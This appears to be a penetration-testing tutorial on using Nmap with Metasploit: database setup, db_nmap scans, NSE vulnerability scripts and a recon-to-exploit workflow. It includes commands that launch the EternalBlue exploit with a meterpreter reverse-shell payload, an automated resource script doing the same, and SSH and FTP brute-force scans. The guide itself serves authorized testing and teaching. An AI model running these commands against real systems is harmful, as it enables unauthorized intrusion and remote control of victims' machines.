# Metasploit with Nmap

## What is Nmap?
- Nmap stands for Network Mapper
- Most popular network scanning tool in the world
- Used for host discovery and port scanning
- Detects service versions and operating systems
- Has scripting engine for advanced scanning
- Free and open source tool
- Works on Windows Linux and macOS
- Comes pre-installed on Kali Linux

---

## Why Combine Nmap with Metasploit?
- Nmap provides detailed scan results
- Metasploit uses scan results for exploitation
- Saves results directly to Metasploit database
- Eliminates manual data entry
- Creates seamless recon to exploit workflow
- Nmap is more powerful for scanning than Metasploit alone
- Metasploit can import and use Nmap XML output
- Best of both tools combined in one workflow

---

## Ways to Use Nmap with Metasploit

### Method 1 - db_nmap Inside Metasploit
- Run Nmap directly from msfconsole
- Results automatically saved to database
- Most convenient method

### Method 2 - Import Nmap XML Output
- Run Nmap outside Metasploit
- Save output as XML file
- Import XML into Metasploit database
- More flexible method

### Method 3 - Nmap NSE Scripts with Metasploit
- Use Nmap scripts for detailed enumeration
- Import results into Metasploit
- Combine NSE findings with Metasploit exploits

---

## Setting Up Database for Nmap Integration

### Start Database
```bash
# start postgresql service
sudo service postgresql start

# initialize metasploit database
sudo msfdb init

# start msfconsole
msfconsole -q

# verify database connection
db_status

# create workspace for project
workspace -a nmap_project
```

---

## db_nmap Command

### What is db_nmap?
- Built in command in msfconsole
- Runs Nmap scan from inside Metasploit
- Automatically saves results to database
- Supports all Nmap flags and options
- Most efficient way to combine both tools

### Basic db_nmap Usage
```bash
# basic host scan
db_nmap 192.168.1.1

# scan entire subnet
db_nmap 192.168.1.0/24

# service version detection
db_nmap -sV 192.168.1.1

# aggressive scan
db_nmap -A 192.168.1.1

# OS detection
db_nmap -O 192.168.1.1

# scan all ports
db_nmap -p- 192.168.1.1

# scan specific ports
db_nmap -p 22,80,443,445,3389 192.168.1.1

# fast scan common ports
db_nmap -F 192.168.1.1

# scan with default scripts
db_nmap -sC 192.168.1.1

# full scan with scripts and versions
db_nmap -sV -sC 192.168.1.1

# aggressive full scan
db_nmap -A -p- 192.168.1.1

# UDP scan
db_nmap -sU 192.168.1.1

# scan without ping
db_nmap -Pn 192.168.1.1

# verbose output
db_nmap -v -sV 192.168.1.1
```

---

## Nmap Scan Types Explained

### SYN Scan Default
```bash
# stealth SYN scan default
db_nmap -sS 192.168.1.1

# sends SYN packet
# receives SYN ACK for open ports
# receives RST for closed ports
# never completes handshake
# requires root privileges
```

### TCP Connect Scan
```bash
# full TCP connect scan
db_nmap -sT 192.168.1.1

# completes full TCP handshake
# less stealthy than SYN scan
# does not require root
```

### UDP Scan
```bash
# UDP port scan
db_nmap -sU 192.168.1.1

# scan specific UDP ports
db_nmap -sU -p 53,67,68,161,162 192.168.1.1

# slower than TCP scan
# important for finding DNS SNMP DHCP
```

### Version Detection Scan
```bash
# detect service versions
db_nmap -sV 192.168.1.1

# intensity level 0-9
db_nmap -sV --version-intensity 9 192.168.1.1

# reveals exact software versions
# helps find matching exploits
```

### OS Detection Scan
```bash
# detect operating system
db_nmap -O 192.168.1.1

# reveals OS type and version
# helps select correct payload
# requires root privileges
```

### Script Scan
```bash
# run default scripts
db_nmap -sC 192.168.1.1

# run specific script
db_nmap --script=smb-vuln-ms17-010 192.168.1.1

# run script category
db_nmap --script=vuln 192.168.1.1
db_nmap --script=auth 192.168.1.1
db_nmap --script=exploit 192.168.1.1
```

### Aggressive Scan
```bash
# aggressive scan includes version OS scripts traceroute
db_nmap -A 192.168.1.1

# combines -sV -O -sC --traceroute
# most comprehensive single scan option
# noisier on network
```

---

## Nmap Output Formats

### Saving Nmap Output Outside Metasploit
```bash
# save as XML for import into Metasploit
nmap -sV -oX scan.xml 192.168.1.1

# save as all formats
nmap -sV -oA scan_results 192.168.1.1
# creates scan_results.xml scan_results.nmap scan_results.gnmap

# save as normal text
nmap -sV -oN scan.txt 192.168.1.1

# save as grepable format
nmap -sV -oG scan.gnmap 192.168.1.1
```

---

## Importing Nmap Results into Metasploit

### Import XML File
```bash
# run nmap outside metasploit
nmap -sV -oX /home/kali/scan_results.xml 192.168.1.0/24

# start msfconsole
msfconsole -q

# import results
db_import /home/kali/scan_results.xml

# verify import
hosts
services
```

### Import Different File Types
```bash
# import nmap xml
db_import /home/kali/nmap_scan.xml

# import nessus scan
db_import /home/kali/nessus_scan.nessus

# import nexpose scan
db_import /home/kali/nexpose_scan.xml

# verify imported data
hosts
services
vulns
```

---

## Viewing Scan Results in Metasploit

### Hosts Command
```bash
# show all discovered hosts
hosts

# show specific information columns
hosts -c address,mac,name,os_name,os_flavor,purpose

# search specific host
hosts -S 192.168.1.1

# export hosts to CSV
hosts -o /home/kali/hosts.csv
```

### Services Command
```bash
# show all discovered services
services

# show services for specific host
services -H 192.168.1.1

# show services on specific port
services -p 80
services -p 445
services -p 22

# show only open services
services -s open

# search by service name
services -S http
services -S ssh
services -S smb
services -S ftp

# export services to CSV
services -o /home/kali/services.csv
```

---

## Nmap to Exploit Workflow

### Complete Workflow Step by Step

#### Step 1 - Setup
```bash
# start services
sudo service postgresql start
msfconsole -q

# check database
db_status

# create workspace
workspace -a target_engagement
```

#### Step 2 - Host Discovery
```bash
# find alive hosts
db_nmap -sn 192.168.1.0/24

# view discovered hosts
hosts
```

#### Step 3 - Port and Service Scan
```bash
# detailed service scan
db_nmap -sV -sC 192.168.1.0/24

# view services discovered
services
```

#### Step 4 - Vulnerability Scan
```bash
# scan for specific vulnerabilities
db_nmap --script=vuln 192.168.1.1

# check for EternalBlue
db_nmap --script=smb-vuln-ms17-010 192.168.1.1

# check for common web vulnerabilities
db_nmap --script=http-vuln* 192.168.1.1
```

#### Step 5 - Find Matching Exploit
```bash
# search exploit based on service found
search ms17-010
search apache 2.4.49
search vsftpd 2.3.4
search type:exploit platform:windows smb

# use matching exploit
use exploit/windows/smb/ms17_010_eternalblue
```

#### Step 6 - Use Scan Results Directly
```bash
# set target from database
hosts -c address
# copy IP from hosts output

# set RHOSTS
set RHOSTS 192.168.1.1

# or use database to set targets
services -p 445 -S smb
# copy IPs of SMB hosts
```

#### Step 7 - Configure and Exploit
```bash
# show options
show options

# set payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444

# run exploit
exploit
```

---

## Useful Nmap NSE Scripts for Penetration Testing

### SMB Scripts
```bash
# check EternalBlue vulnerability
db_nmap --script=smb-vuln-ms17-010 192.168.1.1

# enumerate SMB shares
db_nmap --script=smb-enum-shares 192.168.1.1

# enumerate SMB users
db_nmap --script=smb-enum-users 192.168.1.1

# check SMB security
db_nmap --script=smb-security-mode 192.168.1.1

# check SMB protocols
db_nmap --script=smb-protocols 192.168.1.1
```

### HTTP Scripts
```bash
# enumerate HTTP methods
db_nmap --script=http-methods 192.168.1.1

# find HTTP title
db_nmap --script=http-title 192.168.1.1

# enumerate HTTP directories
db_nmap --script=http-enum 192.168.1.1

# check for SQL injection
db_nmap --script=http-sql-injection 192.168.1.1

# check for XSS
db_nmap --script=http-stored-xss 192.168.1.1

# find open proxies
db_nmap --script=http-open-proxy 192.168.1.1

# WordPress scan
db_nmap --script=http-wordpress-enum 192.168.1.1
```

### SSH Scripts
```bash
# check SSH authentication methods
db_nmap --script=ssh-auth-methods 192.168.1.1

# check SSH host key
db_nmap --script=ssh-hostkey 192.168.1.1

# brute force SSH
db_nmap --script=ssh-brute 192.168.1.1
```

### FTP Scripts
```bash
# check anonymous FTP
db_nmap --script=ftp-anon 192.168.1.1

# check FTP bounce
db_nmap --script=ftp-bounce 192.168.1.1

# brute force FTP
db_nmap --script=ftp-brute 192.168.1.1
```

### DNS Scripts
```bash
# DNS zone transfer
db_nmap --script=dns-zone-transfer 192.168.1.1

# DNS brute force
db_nmap --script=dns-brute target.com

# DNS enumeration
db_nmap --script=dns-srv-enum target.com
```

### Vulnerability Scripts
```bash
# run all vulnerability scripts
db_nmap --script=vuln 192.168.1.1

# check Heartbleed
db_nmap --script=ssl-heartbleed 192.168.1.1

# check ShellShock
db_nmap --script=http-shellshock 192.168.1.1

# check MS08-067
db_nmap --script=smb-vuln-ms08-067 192.168.1.1

# check SSL vulnerabilities
db_nmap --script=ssl-poodle 192.168.1.1
db_nmap --script=ssl-drown 192.168.1.1
```

---

## Automating Nmap and Metasploit

### Resource Script Automation
```bash
# create resource script
nano /home/kali/auto_scan.rc

# add these commands to file
db_nmap -sV -sC 192.168.1.0/24
hosts
services
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set RHOSTS 192.168.1.1
exploit

# run resource script
msfconsole -r /home/kali/auto_scan.rc
```

---

## Tips for Efficient Nmap and Metasploit Workflow

### Scan Order for Efficiency
```bash
# step 1 quick host discovery
db_nmap -sn 192.168.1.0/24

# step 2 quick port scan
db_nmap -F 192.168.1.0/24

# step 3 version scan on discovered hosts
db_nmap -sV -p 22,80,443,445,3389 192.168.1.1

# step 4 aggressive scan on interesting hosts
db_nmap -A 192.168.1.1

# step 5 vulnerability scripts on targets
db_nmap --script=vuln 192.168.1.1
```

### Using Multiple Targets
```bash
# scan multiple specific hosts
db_nmap -sV 192.168.1.1 192.168.1.2 192.168.1.3

# scan from file
db_nmap -sV -iL /home/kali/targets.txt

# scan range
db_nmap -sV 192.168.1.1-50

# scan subnet
db_nmap -sV 192.168.1.0/24
```

---
## Important Points
- Always start postgresql before using db_nmap
- db_nmap saves all results automatically to database
- Import external Nmap XML for offline scans
- Use services command to find targets for specific exploits
- Version detection is most important for finding exploits
- Aggressive scan is noisy and may trigger IDS alerts
- Use -Pn when ICMP is blocked by firewall
- Combine Nmap scripts with Metasploit auxiliary modules
- Always scan only authorized targets
- Document all scan results for reporting purposes
```

---

